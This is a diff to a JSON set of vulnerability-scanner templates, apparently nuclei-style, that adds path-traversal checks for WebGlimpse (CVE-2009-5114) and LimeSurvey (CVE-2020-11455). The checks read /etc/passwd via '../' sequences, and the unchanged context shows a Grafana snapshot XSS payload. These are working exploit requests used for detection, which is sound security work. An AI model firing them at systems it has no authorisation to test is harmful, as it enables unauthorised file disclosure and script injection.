@@ -403,6 +403,40 @@
       ]
     },
     {
+      "id": "CVE-2009-5114",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in wgarcmin.cgi in WebGlimpse 2.18.7 and earlier allows remote attackers to read arbitrary files via a .. (dot dot) in the DOC parameter.",
+        "name": "WebGlimpse 2.18.7 - Directory Traversal",
+        "reference": "- https://www.exploit-db.com/exploits/36994\n- https://www.cvedetails.com/cve/CVE-2009-5114\n",
+        "severity": "high",
+        "tags": "cve,cve2009,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wgarcmin.cgi?NEXTPAGE=D&ID=1&DOC=../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-2307",
       "info": {
         "author": "daffainfo",
@@ -11445,6 +11479,40 @@
           "matchers-condition": "and",
           "raw": [
             "POST /api/snapshots HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nReferer: {{BaseURL}}\ncontent-type: application/json\nConnection: close\n\n{\"dashboard\":{\"annotations\":{\"list\":[{\"name\":\"Annotations & Alerts\",\"enable\":true,\"iconColor\":\"rgba(0, 211, 255, 1)\",\"type\":\"dashboard\",\"builtIn\":1,\"hide\":true}]},\"editable\":true,\"gnetId\":null,\"graphTooltip\":0,\"id\":null,\"links\":[],\"panels\":[],\"schemaVersion\":18,\"snapshot\":{\"originalUrl\":\"javascript:alert('Revers3c')\",\"timestamp\":\"2020-03-30T01:24:44.529Z\"},\"style\":\"dark\",\"tags\":[],\"templating\":{\"list\":[]},\"time\":{\"from\":null,\"to\":\"2020-03-30T01:24:53.549Z\",\"raw\":{\"from\":\"6h\",\"to\":\"now\"}},\"timepicker\":{\"refresh_intervals\":[\"5s\",\"10s\",\"30s\",\"1m\",\"5m\",\"15m\",\"30m\",\"1h\",\"2h\",\"1d\"],\"time_options\":[\"5m\",\"15m\",\"1h\",\"6h\",\"12h\",\"24h\",\"2d\",\"7d\",\"30d\"]},\"timezone\":\"\",\"title\":\"Dashboard\",\"uid\":null,\"version\":0},\"name\":\"Dashboard\",\"expires\":0}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-11455",
+      "info": {
+        "author": "daffainfo",
+        "description": "LimeSurvey before 4.1.12+200324 contains a path traversal vulnerability in application/controllers/admin/LimeSurveyFileManager.php.",
+        "name": "LimeSurvey 4.1.11 - Path Traversal",
+        "reference": "- https://www.exploit-db.com/exploits/48297\n- https://www.cvedetails.com/cve/CVE-2020-11455\n",
+        "severity": "high",
+        "tags": "cve,cve2020,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php/admin/filemanager/sa/getZipFile?path=/../../../../../../../etc/passwd"
           ]
         }
       ]
